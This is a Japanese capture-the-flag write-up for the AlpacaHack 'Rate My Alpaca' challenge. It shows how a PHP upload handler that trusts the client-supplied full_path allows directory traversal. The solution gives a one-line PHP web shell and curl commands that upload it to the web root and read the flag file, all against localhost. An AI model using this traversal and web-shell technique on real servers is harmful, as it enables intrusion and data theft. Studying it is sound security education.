# Rate My Alpaca

https://alpacahack.com/daily/challenges/rate-my-alpaca

## 問題の概要

アップロードされたファイルを次のように `/var/www/uploads/` に保存する PHP サーバーが動いています。

```php
if (isset($_FILES['file'])) {
    $filename = $_FILES['file']['full_path'];
    $uploaddir = '/var/www/uploads/';
    $uploadfile = $uploaddir . $filename;
    $uploadurl = '/uploads/' . $filename;
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);

    $message = "File uploaded to <a href=\"" . $uploadurl . "\">" . $uploadurl . "</a>. Please wait 15~20 business days until we rate your alpaca image.";
}
```

Apache の設定で `/var/www/uploads/` ディレクトリは PHP エンジンが無効化されています。

```
Alias /uploads/ /var/www/uploads/

<Directory /var/www/uploads>
    php_admin_flag engine off
    Require all granted
</Directory>
```

フラグは `/flag-{hash}.txt` に保存されています。

## 解法

[POST メソッドによるアップロード](https://www.php.net/manual/ja/features.file-upload.post-method.php) では、[RFC 1867](https://datatracker.ietf.org/doc/html/rfc1867) に従って multipart/form-data 形式で送られたファイルを処理します。

例えば次のような multipart/form-data のリクエストを送ったとします。

```
--boundary
Content-Disposition: form-data; name="file"; filename="path/to/test.txt"
Content-Type: text/plain

... content of test.txt ...
--boundary--
```

このとき、PHP はアップロードされたファイルを一時ファイルに保存し、`$_FILES` に次のような情報を格納します。

- `$_FILES['file']['tmp_name']`: 保存した一時ファイルのパス
- `$_FILES['file']['name']`: `test.txt`
- `$_FILES['file']['full_path']`: `path/to/test.txt`
- `$_FILES['file']['type']`: `text/plain`
- `$_FILES['file']['size']`: ファイルサイズ
- `$_FILES['file']['error']`: エラーコード

今回のサーバープログラムは `$_FILES['file']['tmp_name']` を `'/var/www/uploads/' . $_FILES['file']['full_path']` に移動させています。

`$_FILES['file']['full_path']` はクライアントが送信した `filename` の値がそのまま使用されるため、ディレクトリトラバーサルで保存先として任意のパスを指定できます。

## 実行手順

まず、フラグを表示する PHP ファイル `exploit.php` を作成します。

```php:exploit.php
<?=shell_exec("cat /flag*")?>
```

curl で `exploit.php` を `/var/www/html/exploit.php` にアップロードします。

```bash
curl -F "file=@exploit.php;filename=../html/exploit.php" http://localhost:3000/
```

これで `http://localhost:3000/exploit.php` にアクセスするとフラグが表示されます。

```bash
curl http://localhost:3000/exploit.php
```
